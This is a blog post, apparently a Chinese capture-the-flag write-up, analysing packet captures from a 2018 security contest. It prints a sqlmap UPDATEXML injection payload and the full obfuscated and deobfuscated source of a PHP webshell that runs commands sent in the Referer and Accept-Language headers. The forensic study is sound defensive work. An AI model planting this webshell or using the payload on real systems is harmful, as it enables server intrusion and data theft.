@@ -1,0 +1,615 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"sun-zzz.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":200,"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="记录一些铁三的流量分析题">
+<meta property="og:type" content="article">
+<meta property="og:title" content="信息安全铁人三项数据赛2018">
+<meta property="og:url" content="https://sun-zzz.github.io/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B.html">
+<meta property="og:site_name" content="rev1ve&#39;s blog">
+<meta property="og:description" content="记录一些铁三的流量分析题">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sun-zzz.github.io/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423212801277.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423213600211.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423214201938.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423221618117.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423223256000.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423230356685.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423231540280.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423231742123.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423231918800.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240424220800333.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240424220929490.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240424234829936.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240424235537584.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240424235818984.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240425000833804.png">
+<meta property="article:published_time" content="2024-04-23T12:24:33.000Z">
+<meta property="article:modified_time" content="2024-06-23T13:46:45.006Z">
+<meta property="article:author" content="rev1ve">
+<meta property="article:tag" content="铁人三项">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sun-zzz.github.io/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423212801277.png">
+
+<link rel="canonical" href="https://sun-zzz.github.io/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>信息安全铁人三项数据赛2018 | rev1ve's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">rev1ve's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links" rel="section"><i class="fas fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://sun-zzz.github.io/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="rev1ve">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="rev1ve's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          信息安全铁人三项数据赛2018
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-04-23 20:24:33" itemprop="dateCreated datePublished" datetime="2024-04-23T20:24:33+08:00">2024-04-23</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-06-23 21:46:45" itemprop="dateModified" datetime="2024-06-23T21:46:45+08:00">2024-06-23</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" itemprop="url" rel="index"><span itemprop="name">流量分析</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B.html" class="post-meta-item leancloud_visitors" data-flag-title="信息安全铁人三项数据赛2018" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>记录一些铁三的流量分析题</p>
+<span id="more"></span>
+
+
+
+<h1 id="题目一"><a href="#题目一" class="headerlink" title="题目一"></a>题目一</h1><p><strong>题目要求：</strong><br><strong>1.黑客攻击的第一个受害主机的网卡IP地址</strong><br><strong>2.黑客对URL的哪一个参数实施了SQL注入</strong><br><strong>3.第一个受害主机网站数据库的表前缀（加上下划线例如abc_）</strong><br><strong>4.第一个受害主机网站数据库的名字</strong></p>
+<p>我们直接查看http流，注意到ip为<code>202.1.1.2</code>对<code>192.168.1.8</code>不断地发包</p>
+<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423212801277.png"></p>
+<p>所以受害主机ip为<code>192.168.1.8</code></p>
+<p>我们筛选一下源ip</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http &amp;&amp; ip.src==202.1.1.2</span><br></pre></td></tr></table></figure>
+
+<p>在分组列表往下翻注意到使用sqlmap进行注入攻击，追踪tcp流</p>
+<p>得到注入参数为<code>list[select]</code></p>
+<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423213600211.png"></p>
+<p>我们在195流注意到响应包泄露了数据表名称前缀为<code>ajtuc</code></p>
+<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423214201938.png"></p>
+<p>或者我们找到最后一次注入的payload，解码如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list[select]=(UPDATEXML(6315,CONCAT(0x2e,0x71717a7671,(SELECT MID((IFNULL(CAST(username AS CHAR),0x20)),1,22) FROM joomla.ajtuc_users ORDER BY id LIMIT 0,1),0x71716b6b71),4235))</span><br></pre></td></tr></table></figure>
+
+<p>得到数据库名称为<code>joomla</code></p>
+<h1 id="题目二"><a href="#题目二" class="headerlink" title="题目二"></a>题目二</h1><p><strong>题目要求：<br>1.黑客第一次获得的php木马的密码是什么<br>2.黑客第二次上传php木马是什么时间<br>3.第二次上传的木马通过HTTP协议中的哪个头传递数据</strong></p>
+<p>题目一已经锁定了目标ip信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.dst == 192.168.1.8 &amp;&amp; http</span><br></pre></td></tr></table></figure>
+
+<p>筛选一下注意到<code>/kkkaaa.php</code></p>
+<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423221618117.png"></p>
+<p>追踪tcp流得到参数为zzz</p>
+<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423223256000.png"></p>
+<p>获取第二个木马时间就要看POST请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.dst == 192.168.1.8 &amp;&amp; http &amp;&amp; http.request.method==&quot;POST&quot;</span><br></pre></td></tr></table></figure>
+
+<p>注意到下面这个包有参数<code>z2</code></p>
+<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423230356685.png"></p>
+<p>我们将十六进制数据解码一下得到php代码（美化一下）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$p=&#x27;l&gt;]ower&quot;;$i&gt;]=$m[1][0].$m[1]&gt;][1];$h&gt;]=$&gt;]sl($ss(m&gt;]d5($i.&gt;]$kh),0&gt;],3))&gt;];$f=$s&gt;]l($s&gt;]s(md5&#x27;;</span><br><span class="line">$d=&#x27;]q=array_v&gt;]&gt;]alues(&gt;]$q);&gt;]preg_match_a&gt;]ll(&quot;/(&gt;][\\w]&gt;])[\\w-&gt;]]+&gt;](?:;q=&gt;]0.([\\d]))?,?/&quot;,&gt;&#x27;;</span><br><span class="line">$W=&#x27;),$ss(&gt;]$s[&gt;]$i],&gt;]0,$e))),$&gt;]&gt;]k)));&gt;]$o=ob_get_content&gt;]&gt;]s();ob_end_&gt;]&gt;]clean();$d=&gt;]base&#x27;;</span><br><span class="line">$e=&#x27;]T_LANGUAGE&quot;];if($rr&gt;]&amp;&amp;$&gt;]ra)&#123;$&gt;]u=pars&gt;]e_&gt;]url($rr);par&gt;]se_st&gt;]r($u[&quot;&gt;]query&quot;],$&gt;]q);$&gt;&#x27;;</span><br><span class="line">$E=&#x27;&gt;]64_e&gt;]ncod&gt;]e&gt;](&gt;]x(gz&gt;]compress($o),$k));pri&gt;]nt(&quot;&lt;$k&gt;$d&lt;&gt;]/$k&gt;&quot;&gt;])&gt;];@&gt;]session_destr&gt;]oy();&#125;&#125;&#125;&#125;&#x27;;</span><br><span class="line">$t=&#x27;($i.&gt;]$kf),0,3&gt;]));$p&gt;]=&quot;&quot;;fo&gt;]r($z=1&gt;];$z&lt;&gt;]count($m&gt;][1]);$z+&gt;]&gt;]+)$p&gt;].=$q[$m[&gt;]2][$z]];i&gt;&#x27;;</span><br><span class="line">$M=&#x27;]$ra,$&gt;]m);if($q&gt;]&amp;&amp;$m&gt;])&#123;@sessi&gt;]on_sta&gt;]&gt;]rt();$s=&amp;$&gt;]_SESS&gt;]ION;$&gt;]&gt;]s&gt;]s=&quot;substr&quot;;$sl=&quot;s&gt;]&gt;]trto&#x27;;</span><br><span class="line">$P=&#x27;]f(s&gt;]tr&gt;]pos($p&gt;],$h)===0)&#123;$s[&gt;]$i]=&quot;&quot;;$p&gt;]=$ss($&gt;]p,3);&gt;]&#125;if(ar&gt;]ray&gt;]_key_exist&gt;]&gt;]s($i,$&gt;]s)&gt;])&#123;$&gt;&#x27;;</span><br><span class="line">$j=str_replace(&#x27;fr&#x27;,&#x27;&#x27;,&#x27;cfrrfreatfrfre_funcfrtfrion&#x27;);</span><br><span class="line">$k=&#x27;];&#125;&#125;re&gt;]&gt;]turn $o;&gt;]&#125;$&gt;]r=$_SERV&gt;]ER;$rr=@$r[&gt;]&quot;HTTP&gt;]_REFERE&gt;]R&quot;];$ra&gt;]=@&gt;]$r[&quot;&gt;]HTTP_A&gt;]CC&gt;]EP&gt;&#x27;;</span><br><span class="line">$g=&#x27;&quot;&quot;;for(&gt;]$i=&gt;]0;$i&lt;$l;&gt;])&gt;]&#123;for($j=0;($j&lt;&gt;]$c&amp;&amp;&gt;]$i&lt;$l);$&gt;]j++,$i&gt;]++)&#123;$o.&gt;]=$t&#123;$i&gt;]&#125;^$k&#123;$j&#125;&gt;&#x27;;</span><br><span class="line">$R=&#x27;$k&gt;]h=&quot;cb4&gt;]2&quot;;$kf=&quot;e130&quot;&gt;];functio&gt;]n&gt;] x($t&gt;],$k)&#123;$c=s&gt;]trle&gt;]&gt;]n($k);$l=strle&gt;]n&gt;]($t)&gt;];$o=&#x27;;</span><br><span class="line">$Q=&#x27;]s[$i].=$p;$e=strp&gt;]&gt;]os(&gt;]$s[$i&gt;]],$f);if($&gt;]e)&#123;$k=$kh.$k&gt;]f;&gt;]ob_sta&gt;]rt();@e&gt;]val(@gzun&gt;]co&gt;&#x27;;</span><br><span class="line">$v=&#x27;]mpress(@x&gt;](@b&gt;]as&gt;]&gt;]e64_decode(pr&gt;]&gt;]e&gt;]g_repla&gt;]ce(array(&quot;/_/&quot;,&quot;/-/&quot;),arr&gt;]ay(&gt;]&quot;/&quot;,&quot;+&quot;&gt;]&#x27;;</span><br><span class="line">$x=str_replace(&#x27;&gt;]&#x27;,&#x27;&#x27;,$R.$g.$k.$e.$d.$M.$p.$t.$P.$Q.$v.$W.$E);</span><br><span class="line">$N=$j(&#x27;&#x27;,$x);</span><br><span class="line">$N();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>很明显是代码混淆过的，注意变量j和x，应该是可以把代码变回去</p>
+<p>在结尾添加即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump($j);</span><br><span class="line">var_dump($x);</span><br></pre></td></tr></table></figure>
+
+<p>发现有eval出现，说明此包为第二次上传木马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">$kh = &quot;cb42&quot;;</span><br><span class="line">$kf = &quot;e130&quot;;</span><br><span class="line">function x($t, $k)</span><br><span class="line">&#123;</span><br><span class="line">    $c = strlen($k);</span><br><span class="line">    $l = strlen($t);</span><br><span class="line">    $o = &quot;&quot;;</span><br><span class="line">    for ($i = 0; $i &lt; $l;) &#123;</span><br><span class="line">        for ($j = 0; ($j &lt; $c &amp;&amp; $i &lt; $l); $j++, $i++) &#123;</span><br><span class="line">            $o .= $t&#123;$i&#125; ^ $k&#123;$j&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $o;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$r = $_SERVER;</span><br><span class="line">$rr = @$r[&quot;HTTP_REFERER&quot;];</span><br><span class="line">$ra = @$r[&quot;HTTP_ACCEPT_LANGUAGE&quot;];</span><br><span class="line">if ($rr &amp;&amp; $ra) &#123;</span><br><span class="line">    $u = parse_url($rr);</span><br><span class="line">    parse_str($u[&quot;query&quot;], $q);</span><br><span class="line">    $q = array_values($q);</span><br><span class="line">    preg_match_all(&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;, $ra, $m);</span><br><span class="line">    if ($q &amp;&amp; $m) &#123;</span><br><span class="line">        @session_start();</span><br><span class="line">        $s =&amp; $_SESSION;</span><br><span class="line">        $ss = &quot;substr&quot;;</span><br><span class="line">        $sl = &quot;strtolower&quot;;</span><br><span class="line">        $i = $m[1][0] . $m[1][4];</span><br><span class="line">        $h = $sl($ss(md5($i . $kh), 0, 3));</span><br><span class="line">        $f = $sl($ss(md5($i . $kf), 0, 3));</span><br><span class="line">        $p = &quot;&quot;;</span><br><span class="line">        for ($z = 1; $z &lt; count($m[1]); $z++) $p .= $q[$m[2][$z]];</span><br><span class="line">        if (strpos($p, $h) === 0) &#123;</span><br><span class="line">            $s[$i] = &quot;&quot;;</span><br><span class="line">            $p = $ss($p, 3);</span><br><span class="line">        &#125;</span><br><span class="line">        if (array_key_exists($i, $s)) &#123;</span><br><span class="line">            $s[$i] .= $p;</span><br><span class="line">            $e = strpos($s[$i], $f);</span><br><span class="line">            if ($e) &#123;</span><br><span class="line">                $k = $kh . $kf;</span><br><span class="line">                ob_start();</span><br><span class="line">                @eval(@gzuncompress(@x(@base64_decode(preg_replace(array(&quot;/_/&quot;, &quot;/-/&quot;), array(&quot;/&quot;, &quot;+&quot;), $ss($s[$i], 0, $e))), $k)));</span><br><span class="line">                $o = ob_get_contents();</span><br><span class="line">                ob_end_clean();</span><br><span class="line">                $d = base64_encode(x(gzcompress($o), $k));</span><br><span class="line">                print(&quot;&lt;$k&gt;$d&lt;/$k&gt;&quot;);</span><br><span class="line">                @session_destroy();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功找到时间</p>
+<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423231540280.png"></p>
+<p>上面的木马中注意到有两个http头，肯定是其中一个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$rr = @$r[&quot;HTTP_REFERER&quot;];</span><br><span class="line">$ra = @$r[&quot;HTTP_ACCEPT_LANGUAGE&quot;];</span><br></pre></td></tr></table></figure>
+
+<p>我们追踪tcp流看一下，注意到footer.php文件</p>
+<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423231742123.png"></p>
+<p>查看一下，发现referer头存在数据传递</p>
+<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423231918800.png"></p>
+<h1 id="题目三"><a href="#题目三" class="headerlink" title="题目三"></a>题目三</h1><p><strong>题目要求：<br>1.内网主机的mysql用户名和请求连接的密码hash是多少(用户:密码hash)<br>2.php代理第一次被使用时最先连接了哪个IP地址</strong></p>
+<p>筛选http并没有收获，所以看下tcp流</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp &amp;&amp; tcp contains &quot;mysql&quot;</span><br></pre></td></tr></table></figure>
+
+<p>注意到请求长度为151的是攻击者对admin用户进行爆破，我们直接看最后一次password的hash值</p>
+<p>得到答案<code>admin:1a3068c3e29e03e3bcfdba6f8669ad23349dc6c4</code></p>
+<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240424220800333.png"></p>
+<p>为了找出连接哪个IP，我们筛选下POST请求</p>
